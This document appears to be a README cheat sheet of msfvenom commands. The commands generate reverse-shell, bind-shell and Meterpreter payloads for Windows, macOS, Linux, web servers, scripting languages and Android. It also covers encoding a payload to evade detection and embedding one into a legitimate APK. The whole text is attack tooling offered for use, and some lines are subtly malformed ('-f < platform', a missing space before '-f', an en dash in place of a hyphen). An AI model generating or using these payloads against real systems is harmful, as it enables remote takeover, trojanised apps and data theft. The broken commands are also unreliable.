# Payloads
Android and different os payloads easy to modify and inject

<h2>Cheetsheet Metasploit</h2>

Windows Payloads
Windows Meterpreter Reverse Shell

<pre>$ msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f exe > payload-name.exe </pre>

Windows Reverse Shell
<pre>$ msfvenom -p windows/shell/reverse_tcp lhost=ip-address lport=port -f exe > payload-name.exe </pre>

Windows Encoded Meterpreter Reverse Shell
<pre>$ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 2 -f exe > payload-name.exe </pre>

Windows Meterpreter Reverse Shellcode
<pre>$ msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f < platform  </pre>

macOS Payloads
macOS Bind Shell
<pre>$ msfvenom -p osx/x86/shell_bind_tcp rhost=ip-address lport=port-f macho > payload-name.macho </pre>

macOS Reverse Shell
<pre>$ msfvenom -p osx/x86/shell_reverse_tcp lhost=ip-address lport=port -f macho > payload-name.macho </pre>

macOS Reverse TCP Shellcode
<pre>$ msfvenom -p osx/x86/shell_reverse_tcp lhost=ip-address lport=port -f < platform  </pre>

Linux Payloads
Linux Meterpreter TCP Reverse Shell
<pre>$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip-address lport=port -f elf > payload-name.elf </pre>

Linux Bind TCP Shell
<pre>$ msfvenom -p generic/shell_bind_tcp rhost=ip-address lport=port -f elf > payload-name.elf </pre>

Linux Bind Meterpreter TCP Shell
<pre>$ msfvenom -p linux/x86/meterpreter/bind_tcp rhost=ip-address lport=port -f elf > payload-name.elf </pre>

Linux Meterpreter Reverse Shellcode
<pre>$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip-address lport=port -f < platform  </pre>

Web-base Payloads
PHP Meterpreter Reverse Shell
<pre>$ msfvenom -p php/meterpreter_reverse_tcp lhost=ip-address LPORT=port -f raw > payload-name.php </pre>

JSP Java Meterpreter Reverse Shell
<pre>$ msfvenom -p java/jsp_shell_reverse_tcp lhost=ip-address lport=port -f raw > payload-name.jsp </pre>

ASP Meterpreter Reverse Shell
<pre>$ msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f asp > payload-nmae.asp </pre>

WAR Reverse TCP Shell
<pre>$ msfvenom -p java/jsp_shell_reverse_tcp lhost=ip-address lport=port -f war > payload-name.war </pre>

Script-Base Payloads
Perl Unix Reverse shell
<pre>$ msfvenom -p cmd/unix/reverse_perl lhost=ip-address lport=port -f raw > payload-name.pl </pre>

Bash Unix Reverse Shell
<pre>$ msfvenom -p cmd/unix/reverse_bash lhost=ip-address lport=port -f raw > payload-name.sh </pre>

Python Reverse Shell
<pre>$ msfvenom -p cmd/unix/reverse_python lhost=ip-address lport=port -f raw > payload-name.py </pre>

Android Payloads
Android Meterpreter reverse Payload
<pre>$ msfvenom –p android/meterpreter/reverse_tcp lhost=ip-address lport=port R > payload-name.apk </pre>

Android Embed Meterpreter Payload
<pre>$ msfvenom -x yourapp.apk android/meterpreter/reverse_tcp lhost=ip-address lport=port -o payload-name.apk </pre>

